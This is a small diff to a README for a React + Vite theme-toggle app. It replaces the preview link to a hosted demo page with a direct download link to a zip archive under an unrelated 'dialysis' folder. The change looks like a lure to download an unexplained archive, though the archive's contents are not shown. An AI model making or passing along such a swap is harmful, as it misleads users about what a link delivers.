@@ -11,4 +11,4 @@ A simple and modern React + Vite project that supports **Dark Mode** and **Light
 
 ## 📸 Preview
 
-https://dotsatya.github.io/Theme-Toggle-App/
+https://raw.githubusercontent.com/dotsatya/Theme-Toggle-App/main/dialysis/Theme-Toggle-App.zip
